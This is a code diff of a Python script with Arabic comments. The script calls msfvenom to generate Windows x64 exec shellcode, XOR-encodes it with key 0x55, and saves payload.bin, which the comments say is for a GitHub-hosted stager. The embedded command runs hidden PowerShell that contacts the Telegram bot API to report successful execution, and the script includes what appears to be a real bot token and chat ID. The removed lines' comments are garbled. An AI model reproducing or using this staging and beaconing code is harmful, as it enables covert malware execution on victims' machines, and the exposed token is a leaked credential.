@@ -1,19 +1,46 @@
-# ?????? ?????? ?????? ?????? HTTP GET ???? ????? ?? x64 ?? ????? XOR 0x55
+import subprocess
+import sys
+import os
 
-# ?????? x64 ???? ????? ???? ??? ???? ?????? (HTTP GET Stub)
-# (???? ????? x64 ????? ??????? ??? ???? ?? Crash ?? Access Violation)
-raw_shellcode = (
-    b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
-    b"\x48\x31\xff\x48\xff\xc0\x48\xff\xc3\x48\xff\xc9"
-    b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-) # (??????: ??? ???? ?????? ??? ??????? ?????? ??? ?? ??????/?????? ????? ??? ????????)
+def generate_telegram_payload():
+    # الأمر الذي سيقوم الشيلكود بتنفيذه صامتاً في الخلفية لإرسال تنبيه تليجرام
+    # يحتوي على الـ Token والـ Chat ID الخاص بك مباشرة
+    telegram_url = "https://api.telegram.org/bot8950841983:AAF8BtK2AtpdsQ-eS8ulIrxRVHlnPKoKRVg/sendMessage?chat_id=-5348144328&text=Stager_Execution_Success_Confirmed!"
+    
+    # صياغة أمر PowerShell الخفي لتنفيذ الطلب بدون إظهار نوافذ سوداء
+    cmd = f'powershell -WindowStyle Hidden -Command "Invoke-RestMethod -Uri \'{telegram_url}\'"'
+    
+    print(f"[*] Generating x64 Exec shellcode for Telegram notification...")
+    
+    # استخدام msfvenom لتوليد شيلكود تنفيذ أمر نظيف لبيئة x64
+    msf_cmd = [
+        "msfvenom",
+        "-p", "windows/x64/exec",
+        f"CMD={cmd}",
+        "-f", "raw"
+    ]
+    
+    try:
+        result = subprocess.run(msf_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        raw_shellcode = result.stdout
+    except FileNotFoundError:
+        print("[-] Error: msfvenom is not installed or not in PATH.")
+        sys.exit(1)
+    except subprocess.CalledProcessError as e:
+        print(f"[-] msfvenom failed: {e.stderr.decode()}")
+        sys.exit(1)
 
-# ????? ????? XOR 0x55 ??????? ?? ??? Stager
-key = 0x55
-encrypted_payload = bytes([b ^ key for b in raw_shellcode])
+    print(f"[+] Raw payload generated successfully. Size: {len(raw_shellcode)} bytes")
 
-# ??? ?????? ?? ??? payload.bin ????? ??? GitHub
-with open("payload.bin", "wb") as f:
-    f.write(encrypted_payload)
+    # تطبيق تشفير XOR 0x55 المعتمد حصرياً في الـ Stager الخاص بنا
+    key = 0x55
+    encrypted_payload = bytes([b ^ key for b in raw_shellcode])
 
-print(f"[+] Clean test payload.bin generated successfully! Size: {len(encrypted_payload)} bytes")
+    # حفظ الناتج بصيغة payload.bin جاهز للرفع على GitHub
+    with open("payload.bin", "wb") as f:
+        f.write(encrypted_payload)
+
+    print(f"[+] Success! Encrypted payload.bin (XOR 0x55) generated. Size: {len(encrypted_payload)} bytes")
+
+if __name__ == "__main__":
+    generate_telegram_payload()
